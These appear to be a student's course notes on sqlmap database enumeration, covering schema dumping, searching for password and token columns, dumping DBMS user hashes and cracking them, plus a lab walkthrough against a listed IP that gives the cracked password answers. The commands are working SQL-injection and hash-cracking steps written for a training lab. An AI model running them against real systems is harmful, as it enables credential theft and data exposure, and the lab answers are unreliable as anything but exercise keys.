# Section 8 — Advanced Database Enumeration

---

## Schema Enumeration

```bash
# Full schema (all DBs, all tables, all columns + types)
sqlmap -u "TARGET" --schema

# Skip noise from system DBs
sqlmap -u "TARGET" --schema --exclude-sysdbs
```

Returns column names and types — useful for spotting password/credential columns at a glance.

---

## Searching (--search)

LIKE-based search across all databases. Three modes:

```bash
# Find databases matching a name
sqlmap -u "TARGET" --search -D admin

# Find tables matching a name
sqlmap -u "TARGET" --search -T user

# Find columns matching a name
sqlmap -u "TARGET" --search -C pass
```

> Search is case-insensitive and uses LIKE — `-C pass` matches `password`, `passwd`, `passphrase`, etc.

---

## Password Hash Cracking (built-in)

When sqlmap detects a password-like column during `--dump`, it offers automatic cracking:

```
[INFO] recognized possible password hashes in column 'password'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
```

- 31 supported hash types (MD5, SHA1, SHA256, MySQL, bcrypt variants, etc.)
- Built-in 1.4M password dictionary at `/usr/share/sqlmap/data/txt/wordlist.tx_`
- Multi-process — uses all CPU cores
- Option to use a custom dictionary or apply common suffixes (slow)

```bash
# Dump credentials table and auto-crack hashes
sqlmap -u "TARGET" --dump -D mydb -T users
```

---

## DBMS User Passwords (`--passwords`)

Dumps DB-level user accounts (e.g., `mysql.user`) and offers to crack them:

```bash
sqlmap -u "TARGET" --passwords --batch
```

Output:
```
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass
```

> These are DB authentication accounts (MySQL root, debian-sys-maint, etc.) — different from app users stored in app tables.

---

## The "Just Do Everything" Switch

```bash
sqlmap -u "TARGET" --all --batch
```

`--all` + `--batch` performs full enumeration with no prompts:
- All DBs, tables, columns dumped
- All hashes cracked
- All system info collected (banner, user, DBA status, file privs)
- Output saved to `~/.local/share/sqlmap/output/<host>/`

> Useful for full pentests where you have time. Painfully slow for blind injection — don't use in CTF.

---

## Lab — Case 1

**Target:** `154.57.164.72:30732`

### Q1 — Column containing "style" in its name

```bash
sqlmap -u "http://154.57.164.72:30732/case1.php?id=1" \
  --dbms=mysql --batch --technique=U --no-cast \
  --search -C style
```

Only one match across all databases:
```
Database: information_schema
Table: ROUTINES
| PARAMETER_STYLE |
```

**Q1 Answer:** `PARAMETER_STYLE`

---

### Q2 — Kimberly user's password

Dump the password hash with a WHERE filter, then crack it.

```bash
sqlmap -u "http://154.57.164.72:30732/case1.php?id=1" \
  --dbms=mysql --batch --technique=U --no-cast \
  -D testdb -T users -C name,password \
  --where="name LIKE 'Kimberly%'" --dump
```

Result:
```
| Kimberly Wright | d642ff0feca378666a8727947482f1a4702deba0 |
```

Hash is SHA1. Either let sqlmap auto-crack (Y at the prompt) or use hashcat:
```bash
echo "d642ff0feca378666a8727947482f1a4702deba0" > hash.txt
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
```

**Q2 Answer:** `Enizoom1609`

---

## Exam Notes

- `--schema --exclude-sysdbs` is the fastest way to map an unfamiliar DB
- `--search -C <keyword>` shortcuts hunting for sensitive columns (`pass`, `cc`, `ssn`, `key`, `secret`, `token`)
- `--where=` accepts standard SQL — use LIKE with `%` for partial matches
- sqlmap's built-in cracker handles SHA1, MD5, MySQL hashes natively — try it before reaching for hashcat
- The default sqlmap wordlist is 1.4M entries — rockyou.txt has 14M; switch wordlists if built-in fails
